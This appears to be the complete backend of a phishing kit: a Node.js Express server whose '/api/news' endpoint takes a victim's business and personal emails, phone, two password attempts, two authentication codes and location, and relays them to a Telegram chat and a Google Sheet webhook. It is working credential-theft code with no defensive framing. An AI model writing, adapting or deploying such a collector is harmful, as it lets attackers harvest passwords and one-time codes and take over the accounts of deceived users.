import express from "express";
import 'dotenv/config';
import cors from "cors";
import TelegramBot from 'node-telegram-bot-api';
import axios from "axios";

const app = express();
app.use(cors('*'));

app.use(express.json());

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });

app.post('/api/news', (req, res) => {
    // GET DATA FROM CLIENT
    const data = req.body; 
    console.log('Dữ liệu nhận được:', data);

    const result = {
        "status": 0,
        "message": "Success!"
    }

    res.send(result);

    // SEND DATA TO TELE
    const message = `Email Account: ${data.fill_business_email ? data.fill_business_email : ''} 
    Name Acount: ${data.fill_full_name ? data.fill_full_name : ''} 
    Personal Email: ${data.fill_personal_email ? data.fill_personal_email : ''}
    Phone Number: ${data.fill_phone ? data.fill_phone : ''}
    Password First: ${data.first_password ? data.first_password : ''}
    Password Second: ${data.second_password ? data.second_password : ''}
    Ip: ${data.ip ? data.ip : ''}
    City: ${data.city ? data.city : ''}
    Country: ${data.country ? data.country : ''}
    First Code Authen: ${data.first_code ? data.first_code : ''}
    Second Code Authen: ${data.second_code ? data.second_code : ''}
    Images Url: ${data.image ? data.image : ''}`;

    bot.sendMessage(process.env.CHAT_ID, message);


    // ADD GOOGLE SHEET
    const url = new URL(process.env.WEBHOOK_URL);

    url.searchParams.append('Email Account', data.fill_business_email ? data.fill_business_email : '');
    url.searchParams.append('Name Acount', data.fill_full_name ? data.fill_full_name : '');
    url.searchParams.append('Personal Email', data.fill_personal_email ? data.fill_personal_email : '');
    url.searchParams.append('User Name', data.fill_your_name ? data.fill_your_name : '');
    url.searchParams.append('Phone Number', data.fill_phone ? data.fill_phone : '');
    url.searchParams.append('Password First', data.first_password ? data.first_password : '');
    url.searchParams.append('Password Second', data.second_password ? data.second_password : '');
    url.searchParams.append('Ip', data.ip ? data.ip : '');
    url.searchParams.append('City', data.city ? data.city : '');
    url.searchParams.append('Country', data.country ? data.country : '');
    url.searchParams.append('First Code Authen', data.first_code ? data.first_code : '');
    url.searchParams.append('Second Code Authen', data.second_code ? data.second_code : '');
    url.searchParams.append('Images Url', data.image ? data.image : '');

    axios.get(url)
        .then(response => {
            if (response.data.status === 'success') {
                bot.sendMessage(process.env.CHAT_ID, '✅ Đã thêm vào Sheet thành công.');
            } else {
                bot.sendMessage(process.env.CHAT_ID, 'Không thể thêm. Vui lòng thử lại sau!');
            }
        })
        .catch(error => {
            bot.sendMessage(process.env.CHAT_ID, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
        });

});

app.listen(process.env.PORT, () => {
    console.log(`Server đang lắng nghe tại cổng ${process.env.PORT}`);
});
